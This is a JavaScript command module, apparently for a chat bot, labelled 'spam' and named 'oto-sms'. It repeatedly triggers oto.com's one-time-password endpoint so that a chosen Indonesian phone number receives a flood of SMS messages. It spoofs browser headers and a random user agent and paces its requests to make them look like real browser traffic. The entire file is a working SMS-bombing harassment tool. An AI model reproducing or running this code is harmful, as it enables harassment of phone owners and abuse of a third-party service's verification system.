const fakeUA = require('fake-useragent');
const randomUA = fakeUA().toString();
require('../../config');

module.exports = {
    type: 'spam',
    command: 'oto-sms',
    operate: async (context) => {
        const { ryozingod, m, q, joreply, isPremium, prefix, command, sleep } = context;

        if (isPremium) return joreply(mess.premium);
        if (!q) return joreply(`Example: ${prefix + command} 62,878937388273|1`);

        let matches = q.match(/62,(\d+)\|(\d+)/);
        if (!matches) return joreply('Invalid input format.');

        let anjayy = matches[1];
        let jumlah = matches[2];

        for (let i = 0; i < jumlah; i++) {
            await fetch('https://www.oto.com/ovb/send-otp?lang=id', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'Accept': 'application/json, text/javascript, */*; q=0.01',
                    'Accept-Encoding': 'gzip, deflate, br, zstd',
                    'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                    'Origin': 'https://www.oto.com',
                    'Referer': 'https://www.oto.com/ovb/user-login',
                    'Sec-Ch-Ua': '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
                    'Sec-Ch-Ua-Mobile': '?0',
                    'Sec-Ch-Ua-Platform': '"Windows"',
                    'Sec-Fetch-Dest': 'empty',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Site': 'same-origin',
                    'User-Agent': randomUA,
                    'X-Requested-With': 'XMLHttpRequest'
                },
                body: new URLSearchParams({
                    mobile: anjayy,
                    bookingId: '0',
                    businessUnit: 'mobil'
                })
            })
            .then(response => response.json())
            .then(data => joreply(`${data}`))
            .catch(error => m.reply('Error : ' + error));
            await sleep(25000)
        }
        await m.reply(`${mess.succes}`)
    }
};